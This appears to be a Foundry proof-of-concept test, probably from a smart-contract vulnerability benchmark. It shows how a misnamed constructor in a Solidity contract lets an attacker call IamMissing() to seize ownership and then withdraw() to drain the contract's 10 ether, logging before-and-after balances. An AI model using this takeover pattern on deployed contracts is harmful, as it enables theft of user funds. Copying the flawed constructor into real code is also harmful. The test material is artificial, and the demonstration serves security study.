// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name1.sol";

contract MissingTest is Test {
    Missing public missing;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy contract normally
        vm.prank(owner);
        missing = new Missing();
        
        // Fund the contract with 10 ether
        deal(address(missing), 10 ether);
    }

    function testAnyoneCanBecomeOwner() public {
        console.log("--- BEFORE INITIAL ATTACK ---");
        uint256 contractBalanceBefore = address(missing).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract Balance (pre-atk):", contractBalanceBefore);
        console.log("Attacker Balance (pre-atk):", attackerBalanceBefore);

        // Trigger Step 1: Attacker claims ownership
        console.log("--- TRIGGER ACTION 1: Attacker calls IamMissing() ---");
        vm.prank(attacker);
        missing.IamMissing();

        // Trigger Step 2: Attacker withdraws funds
        console.log("--- TRIGGER ACTION 2: Attacker calls withdraw() ---");
        vm.prank(attacker);
        missing.withdraw();

        console.log("--- AFTER FUNDS TRANSFER ---");
        uint256 contractBalanceAfter = address(missing).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract Balance (post-atk):", contractBalanceAfter);
        console.log("Attacker Balance (post-atk):", attackerBalanceAfter);

        console.log("--- STATE CHANGE ANALYSIS ---");
        console.log("Contract Balance Change:", contractBalanceBefore - contractBalanceAfter);
        console.log("Attacker Balance Change:", attackerBalanceAfter - attackerBalanceBefore);

        // Vulnerability verdict logic
        if (contractBalanceAfter == 0 && contractBalanceBefore == 10 ether && attackerBalanceAfter == attackerBalanceBefore + 10 ether) {
            console.log("Vulnerability Exists: Attacker successfully became owner and stole 10 ether from contract");
        } else {
            console.log("Vulnerability not Exist: Contract funds not stolen or incorrect amount transferred");
        }
    }
}